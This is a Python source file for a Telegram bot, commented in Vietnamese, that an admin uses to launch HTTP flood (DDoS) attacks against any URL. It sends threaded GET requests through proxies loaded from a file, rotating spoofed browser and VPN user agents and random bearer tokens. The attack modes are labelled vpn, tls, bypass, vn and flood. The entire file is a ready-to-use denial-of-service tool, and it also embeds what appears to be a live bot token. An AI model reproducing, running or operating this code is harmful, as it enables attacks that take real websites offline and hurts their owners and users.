import requests
import threading
from time import sleep
from random import choice, randint
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
from telegram import Update
from telegram.ext.callbackcontext import CallbackContext

# Biến toàn cục
STATUS = None
BOT_STATUS = True
proxies = []
admin_id = 6081972689  # Thay bằng Telegram ID của admin
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 7.1; GT-I9100 Build/KTU84P) AppleWebKit/603.12 (KHTML, like Gecko) Chrome/50.0.3755.367 Mobile Safari/600.8",
    "Mozilla/5.0 (Linux; Android 5.0; SM-N910V Build/LRX22C) AppleWebKit/601.33 (KHTML, like Gecko) Chrome/54.0.1548.302 Mobile Safari/537.0",
    "Mozilla/5.0 (Linux; U; Android 7.1; Pixel C Build/NRD90M) AppleWebKit/600.2 (KHTML, like Gecko) Chrome/53.0.2480.357 Mobile Safari/600.7",
    "Mozilla/5.0 (Linux; U; Android 7.0; Nexus 7 Build/NME91E) AppleWebKit/537.24 (KHTML, like Gecko) Chrome/55.0.1165.180 Mobile Safari/535.4",
    "Mozilla/5.0 (Android; Android 4.4.4; IQ4502 Quad Build/KOT49H) AppleWebKit/603.22 (KHTML, like Gecko) Chrome/55.0.3246.371 Mobile Safari/535.0",
    "Mozilla/5.0 (Linux; U; Android 5.0.1; SAMSUNG SM-G925FQ Build/KOT49H) AppleWebKit/536.8 (KHTML, like Gecko) Chrome/49.0.2349.273 Mobile Safari/533.8",
    "Mozilla/5.0 (Android; Android 5.1.1; SM-G935S Build/LMY47X) AppleWebKit/601.8 (KHTML, like Gecko) Chrome/51.0.1541.177 Mobile Safari/603.6"
]
vpn_user_agents = [
    "Shadowrocket/2.1.10 CFNetwork/1220.1 Darwin/20.3.0",
    "v2rayNG/1.7.20 (Android; Mobile; rv:91.0) Gecko/20100101 Firefox/91.0",
    "CyberGhost/7.4.1 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "IPVanish/3.0.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "PrivateVPN/3.1.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "TunnelBear/3.5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Windscribe/2.3.4 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "HMA/5.5.7 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "SaferVPN/4.0.1 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "VyprVPN/4.2.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mullvad/2021.8 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Tor/0.4.5.7 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]
# Đọc proxy từ tệp
def load_proxies():
    global proxies
    try:
        with open('proxy.txt') as f:
            proxies = f.read().splitlines()
        print("Đã tải danh sách proxy.")
    except FileNotFoundError:
        print("Không tìm thấy tệp proxy.txt.")

# Random token cho VPN
def random_token():
    return ''.join([choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(16)])

# Thay thế chuỗi %RAND%
def replace_rand(url):
    while "%RAND%" in url:
        rand_str = ''.join([chr(randint(97, 122)) for _ in range(8)])
        url = url.replace("%RAND%", rand_str, 1)
    return url

# Tự động thêm www
def add_www(url):
    if "://" in url:
        scheme, rest = url.split("://", 1)
        if not rest.startswith("www."):
            rest = "www." + rest
        return f"{scheme}://{rest}"
    return url

# Hàm đếm ngược
def countdown(s, update, url):
    global STATUS
    STATUS = True
    for i in range(s, 0, -1):
        sleep(1)
    STATUS = False
    update.message.reply_text(f"Tấn công {url} đã kết thúc.")

# Hàm thực hiện tấn công với một proxy
def attack_thread(url, proxy, headers, update):
    while STATUS:
        if not BOT_STATUS:
            break
        try:
            requests.get(url, proxies=proxy, headers=headers, timeout=5)
            print(f"Tấn công với proxy: {proxy['http']}")
        except:
            pass

# Hàm tạo luồng tấn công
def start_attack(url, duration, headers_template, update):
    global STATUS
    threading.Thread(target=countdown, args=(duration, update, url)).start()
    url = add_www(url)
    for proxy_line in proxies:
        proxy = {'http': 'http://' + proxy_line}
        headers = headers_template.copy()
        headers['User-Agent'] = choice(user_agents)
        threading.Thread(target=attack_thread, args=(url, proxy, headers, update)).start()

# Hàm tấn công VPN
def vpn_attack(url, duration, update):
    headers_template = {
        'Authorization': f"Bearer {random_token()}",
    }
    start_attack(url, duration, headers_template, update)

# Hàm tấn công TLS
def tls_attack(url, duration, update):
    headers_template = {
        'Connection': 'keep-alive',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'HTTP-Version': 'HTTP/2' if randint(0, 1) else 'HTTP/1.1',
    }
    start_attack(url, duration, headers_template, update)

# Hàm tấn công VN
def vn_attack(url, duration, update):
    headers_template = {
        'Geo-IP': 'VN',
    }
    start_attack(url, duration, headers_template, update)

# Hàm tấn công BYPASS
def bypass_attack(url, duration, update):
    headers_template = {
        'Connection': 'keep-alive',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    }
    start_attack(url, duration, headers_template, update)

# Hàm tấn công FLOOD
def flood_attack(url, duration, update):
    headers_template = {
        'Connection': 'keep-alive',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'HTTP-Version': 'HTTP/2' if randint(0, 1) else 'HTTP/1.1',
    }
    start_attack(url, duration, headers_template, update)

# Kiểm tra quyền admin
def is_admin(update):
    return update.message.from_user.id == admin_id

# Lệnh bật bot
def start_bot(update: Update, context: CallbackContext):
    global BOT_STATUS
    if not is_admin(update):
        update.message.reply_text("Bạn không có quyền thực hiện thao tác này.")
        return
    BOT_STATUS = True
    update.message.reply_text("Bot đã bật và sẵn sàng hoạt động.")

# Lệnh tắt bot
def stop_bot(update: Update, context: CallbackContext):
    global BOT_STATUS
    if not is_admin(update):
        update.message.reply_text("Bạn không có quyền thực hiện thao tác này.")
        return
    BOT_STATUS = False
    update.message.reply_text("Bot đã tắt. Dừng mọi hoạt động.")

# Lệnh xử lý /tang
def tang(update, context):
    global BOT_STATUS
    if not BOT_STATUS:
        update.message.reply_text("Bot đang tắt. Vui lòng bật bot trước khi sử dụng lệnh này.")
        return
    try:
        method = context.args[0].lower()
        url = replace_rand(context.args[1])  # Random %RAND%
        duration = int(context.args[2])
        if method == "vpn":
            update.message.reply_text(f"Bắt đầu VPN:\nURL: {url}\nThời gian: {duration} giây")
            threading.Thread(target=vpn_attack, args=(url, duration, update)).start()
        elif method == "vn":
            update.message.reply_text(f"Bắt đầu VN:\nURL: {url}\nThời gian: {duration} giây")
            threading.Thread(target=vn_attack, args=(url, duration, update)).start()
        elif method == "tls":
            update.message.reply_text(f"Bắt đầu TLS:\nURL: {url}\nThời gian: {duration} giây")
            threading.Thread(target=tls_attack, args=(url, duration, update)).start()
        elif method == "bypass":
            update.message.reply_text(f"Bắt đầu BYPASS:\nURL: {url}\nThời gian: {duration} giây")
            threading.Thread(target=bypass_attack, args=(url, duration, update)).start()
        elif method == "flood":
            update.message.reply_text(f"Bắt đầu FLOOD:\nURL: {url}\nThời gian: {duration} giây")
            threading.Thread(target=flood_attack, args=(url, duration, update)).start()
        else:
            update.message.reply_text("method không hợp lệ")
    except (IndexError, ValueError):
        update.message.reply_text("Sai cú pháp. Sử dụng: /attack <method> <url> <time>")

# Hàm cập nhật proxy từ tệp
def update_proxy(update: Update, context: CallbackContext):
    if not is_admin(update):
        update.message.reply_text("Bạn không có quyền thực hiện thao tác này")
        return
    file = update.message.document.get_file()
    file.download("proxy.txt")
    load_proxies()
    update.message.reply_text("Danh sách proxy đã được cập nhật thành công")

# Hàm chính
def main():
    TOKEN = '8178485363:AAGzYzstr-C6Gj9A8sR2MguA70f5wPFg6Q0'
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    load_proxies()
    dp.add_handler(CommandHandler("on", start_bot))
    dp.add_handler(CommandHandler("off", stop_bot))
    dp.add_handler(CommandHandler("attack", tang))
    dp.add_handler(MessageHandler(Filters.document, update_proxy))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main() 
